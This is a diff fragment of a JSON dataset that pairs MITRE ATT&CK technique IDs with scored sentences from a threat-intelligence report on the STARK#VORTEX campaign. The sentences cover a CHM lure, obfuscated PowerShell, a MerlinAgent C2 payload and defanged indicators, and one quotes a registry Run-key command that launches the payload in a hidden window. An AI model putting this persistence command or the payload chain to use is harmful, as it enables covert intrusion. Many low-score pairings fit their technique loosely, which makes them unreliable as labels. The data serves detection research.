+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.4813
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.4552
+      },
+      {
+        "sentence": "If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.",
+        "score": 0.4068
+      },
+      {
+        "sentence": "Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective.",
+        "score": 0.3039
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.4013
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.4823
+      },
+      {
+        "sentence": "The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier.",
+        "score": 0.318
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.3328
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.3859
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.3202
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.5105
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.5491
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.322
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.3312
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.5747
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.4087
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.3293
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.487
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.3106
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.5754
+      },
+      {
+        "sentence": "Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443.",
+        "score": 0.7153
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.5353
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.4046
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.3281
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.3193
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.5345
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.338
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.3319
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.4054
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.3646
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.481
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.4122
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.3417
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.3216
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3526
+      }
+    ],
+    "T1562.001": [
+      {
+        "sentence": "As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down.",
+        "score": 0.3012
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.3043
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.3328
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.5912
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.3061
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.3377
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.3812
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.4072
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.3315
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.3503
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.3243
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.3261
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.5307
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.3023
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.3024
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.3175
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.3365
+      }
+    ],
+    "T1112": [
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.327
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.3528
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.3283
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.3012
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.3379
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.3733
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.328
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.3236
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.6489
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.3369
+      }
+    ],
+    "T1547.001": [
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.4964
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.3073
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.364
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.7879
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.4583
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.3168
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.3653
+      }
+    ]
+  }
+}
